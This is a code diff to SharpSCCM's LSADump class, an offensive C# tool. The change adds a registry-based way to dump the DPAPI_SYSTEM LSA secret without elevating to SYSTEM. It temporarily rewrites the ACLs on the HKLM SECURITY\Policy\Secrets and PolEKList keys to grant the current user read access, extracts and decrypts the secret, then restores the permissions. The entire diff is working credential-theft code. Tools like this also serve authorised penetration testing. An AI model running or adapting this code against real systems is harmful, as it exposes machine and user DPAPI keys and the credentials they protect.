@@ -10,12 +10,17 @@ using System.Text.RegularExpressions;
 using System.Text;
 using System.Security.Cryptography;
 using System.Collections;
+using Microsoft.Win32;
+using System.Security.AccessControl;
+using System.Data;
+using System.Runtime.InteropServices.ComTypes;
+using System.Net;
 
 namespace SharpSCCM
 {
     public class LSADump
     {
-        public static List<byte[]> GetDPAPIKeys(bool show = false)
+        public static List<byte[]> GetDPAPIKeys(bool show = false, bool reg = false)
         {
             // retrieves the "DPAPI_SYSTEM" LSA secret wuth the GetLSASecret() function,
             //  returning a list of @(machineDPAPI, userDPAPI)
@@ -23,7 +28,16 @@ namespace SharpSCCM
 
             List<byte[]> dpapiKeys = new List<byte[]>();
 
-            byte[] dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM");
+            byte[] dpapiKeyFull;
+            if (reg)
+            {
+                dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM", reg);
+            }
+            else
+            {
+                dpapiKeyFull = GetLSASecret("DPAPI_SYSTEM");
+            }
+
             byte[] dpapiKeyMachine = new byte[20];
             byte[] dpapiKeyUser = new byte[20];
 
@@ -43,7 +57,7 @@ namespace SharpSCCM
             return dpapiKeys;
         }
 
-        public static byte[] GetLSASecret(string secretName)
+        public static byte[] GetLSASecret(string secretName, bool reg = false)
         {
             // elevates to SYSTEM, retrieves the LSA decryption key (GetLSAKey()),
             //  and uses that to decrypt the given "secretName" LSA secret
@@ -52,6 +66,20 @@ namespace SharpSCCM
 
             bool alreadySystem = false;
 
+            string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;   // Get current user context
+            RegistrySecurity originalAcl = new RegistrySecurity();                              // Create a new ACL object to store the original registry key ACL
+            RegistrySecurity newAcl = new RegistrySecurity();                                   // Create a new ACL object to store the modified registry key ACL
+            RegistryAccessRule newRule;
+            RegistrySecurity revertedAcl = new RegistrySecurity();                              // Create a new ACL object to store the reverted registry key ACL
+
+            // Registry keys that require permissions modification
+            string[] LsaRegKeys = new string[] 
+                { 
+                    "SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\\CurrVal\\",
+                    "SECURITY\\Policy\\PolEKList"
+                };
+
+
             if (!Helpers.IsHighIntegrity())
             {
                 Console.WriteLine("[X] You need to be in high integrity to extract LSA secrets!");
@@ -59,16 +87,43 @@ namespace SharpSCCM
             }
             else
             {
-                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                // Check if we're already system
                 if (currentName == "NT AUTHORITY\\SYSTEM")
                 {
                     alreadySystem = true;
                 }
-                else
+
+                // If we're not system and we want to escalate
+                else if ((reg == false) && (alreadySystem == false))
                 {
                     // elevated but not system, so gotta GetSystem() first
                     Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                     Helpers.GetSystem();
+                }
+
+                // If we're not system and we don't want to escalate, modify the LSA secrets reg key permissions instead
+                else if ((reg == true) && (alreadySystem == false))
+                {
+                    Console.WriteLine("\r\n");
+                    foreach (string key in LsaRegKeys)
+                    {
+                        Console.WriteLine("[*] Modifying permissions on registry key: {0}", key);
+
+                        // Backup the current ACL
+                        originalAcl = Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ReadPermissions).GetAccessControl();
+
+                        // Copy the current ACL into a new ACL
+                        newAcl = originalAcl;
+
+                        // Create a new rule that grants the current user read permissions on the key
+                        newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
+
+                        // Append the new rule to the new ACL
+                        newAcl.AddAccessRule(newRule);
+
+                        // Apply the new ACL to the key
+                        Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ChangePermissions).SetAccessControl(newAcl);
+                    }
                 }
             }
 
@@ -93,7 +148,21 @@ namespace SharpSCCM
             byte[] IV = new byte[16];
             byte[] keyPathPlaintext = Crypto.LSAAESDecrypt(tmpKey, keyEncryptedDataRemainder);
 
-            if (!alreadySystem)
+            // Revert reg key permissions to the original ACL
+            if (reg)
+            {
+                foreach (string key in LsaRegKeys)
+                {
+                    Console.WriteLine("[*] Reverting permissions on registry key: {0}", key);
+                    revertedAcl = newAcl;
+                    newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
+                    revertedAcl.RemoveAccessRule(newRule);
+                    Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions).SetAccessControl(revertedAcl);
+                }
+                Console.WriteLine("\r\n");
+            }
+
+            if ((!alreadySystem) && (!reg))
             {
                 Console.WriteLine("[*] RevertToSelf()\r\n");
                 Interop.RevertToSelf();
